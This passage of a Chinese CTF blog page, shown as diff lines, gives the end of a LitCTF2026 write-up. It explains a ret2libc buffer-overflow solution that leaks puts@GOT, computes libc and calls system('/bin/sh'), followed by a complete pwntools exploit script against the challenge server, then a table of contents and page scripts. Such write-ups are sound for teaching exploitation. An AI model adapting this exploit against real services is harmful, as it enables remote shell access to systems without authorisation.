+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251319897.png"
+                      alt="img"
+                ></p>
+<p>第二段rop：先泄露 <code>puts@GOT</code> 的真实地址，计算 libc 基址；得到 <code>system</code> 和 <code>&quot;/bin/sh&quot;</code> 的地址，第二次溢出时调用 <code>system(&quot;/bin/sh&quot;)</code> 获取 shell，cat flag：flag{q4iub8cy-6mf7-4wg-8jfe-qt5g2nyvjlsg6}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251319581.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;challenge.cyclens.tech&quot;</span>, <span class="number">31541</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=False)</span><br><span class="line">OFFSET = <span class="number">72</span></span><br><span class="line">POP_RDI, RET = <span class="number">0x4011B7</span>, <span class="number">0x4011B8</span></span><br><span class="line">LEAK, VULN   = <span class="number">0x4011C3</span>, <span class="number">0x4011F0</span></span><br><span class="line">PUTS_GOT     = <span class="number">0x4033D8</span></span><br><span class="line">def <span class="title function_">leak</span><span class="params">(addr)</span>:</span><br><span class="line">    p.sendafter(b<span class="string">&quot;Tell me your name: &quot;</span>,</span><br><span class="line">        flat(b<span class="string">&quot;A&quot;</span>*OFFSET, RET, POP_RDI, addr, LEAK, RET, VULN)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="type">int</span>(re.search(rb<span class="string">&quot;0x[0-9a-fA-F]+&quot;</span>, p.recvline()).group(), <span class="number">16</span>)</span><br><span class="line">puts = leak(PUTS_GOT)</span><br><span class="line">libc.address = puts - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(f<span class="string">&quot;libc base = &#123;hex(libc.address)&#125;&quot;</span>)</span><br><span class="line">system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh  = next(libc.search(b<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">p.sendafter(b<span class="string">&quot;Tell me your name: &quot;</span>,</span><br><span class="line">    flat(b<span class="string">&quot;A&quot;</span>*OFFSET, RET, POP_RDI, binsh, system, libc.sym[<span class="string">&quot;exit&quot;</span>])</span><br><span class="line">)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/04/29/NewStar2025week1-2%E5%A4%8D%E7%8E%B0wp/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">NewStar2025week1-2复现wp</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">LitCTF2026wp全解</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-lsb-base64"><span class="nav-number">1.1.</span> <span class="nav-text">[LitCTF2026] lit_lsb_base64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-rush-qr"><span class="nav-number">1.2.</span> <span class="nav-text">[LitCTF2026] lit_rush_qr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-sstv"><span class="nav-number">1.3.</span> <span class="nav-text">[LitCTF2026] lit_sstv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-welcome"><span class="nav-number">1.4.</span> <span class="nav-text">[LitCTF2026] lit_welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-pyjail-reader"><span class="nav-number">1.5.</span> <span class="nav-text">[LitCTF2026] lit_pyjail_reader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-pyjail-unicode"><span class="nav-number">1.6.</span> <span class="nav-text">[LitCTF2026] lit_pyjail_unicode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">2.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-xor-two-story"><span class="nav-number">2.1.</span> <span class="nav-text">[LitCTF2026] lit_xor_two_story</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-elgamal-handshake"><span class="nav-number">2.2.</span> <span class="nav-text">[LitCTF2026] lit_elgamal_handshake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-rsa-neighbor"><span class="nav-number">2.3.</span> <span class="nav-text">[LitCTF2026] lit_rsa_neighbor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-tiny-key-aes"><span class="nav-number">2.4.</span> <span class="nav-text">[LitCTF2026] lit_tiny_key_aes</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reverse"><span class="nav-number">3.</span> <span class="nav-text">reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-xor-chain"><span class="nav-number">3.1.</span> <span class="nav-text">[LitCTF2026] lit_xor_chain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-b64-alphabet"><span class="nav-number">3.2.</span> <span class="nav-text">[LitCTF2026] lit_b64_alphabet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-rc4-variant"><span class="nav-number">3.3.</span> <span class="nav-text">[LitCTF2026] lit_rc4_variant</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-tea-standard"><span class="nav-number">3.4.</span> <span class="nav-text">[LitCTF2026] lit_tea_standard</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-xtea-tweak"><span class="nav-number">3.5.</span> <span class="nav-text">[LitCTF2026] lit_xtea_tweak</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">4.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-ezsql"><span class="nav-number">4.1.</span> <span class="nav-text">[LitCTF2026] lit_ezsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-Northbridge-Document-Hub"><span class="nav-number">4.2.</span> <span class="nav-text">[LitCTF2026] Northbridge Document Hub</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-%E5%8D%8E%E8%BE%B0%E4%BC%81%E4%B8%9A%E6%9C%8D%E5%8A%A1%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0"><span class="nav-number">4.3.</span> <span class="nav-text">[LitCTF2026] 华辰企业服务运营平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-reverse-my-web"><span class="nav-number">4.4.</span> <span class="nav-text">[LitCTF2026] lit_reverse_my_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-ezssti"><span class="nav-number">4.5.</span> <span class="nav-text">[LitCTF2026] lit_ezssti</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">5.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-ret2text32"><span class="nav-number">5.1.</span> <span class="nav-text">[LitCTF2026] lit_ret2text32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-integer-overflow"><span class="nav-number">5.2.</span> <span class="nav-text">[LitCTF2026] lit_integer_overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-ret2shellcode"><span class="nav-number">5.3.</span> <span class="nav-text">[LitCTF2026] lit_ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-ropchain"><span class="nav-number">5.4.</span> <span class="nav-text">[LitCTF2026] lit_ropchain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-ret2syscall32"><span class="nav-number">5.5.</span> <span class="nav-text">[LitCTF2026] lit_ret2syscall32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF2026-lit-ret2libc"><span class="nav-number">5.6.</span> <span class="nav-text">[LitCTF2026] lit_ret2libc</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">whyy</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 3 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="fa-regular fa-arrow-up"></i>
+		</li>
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
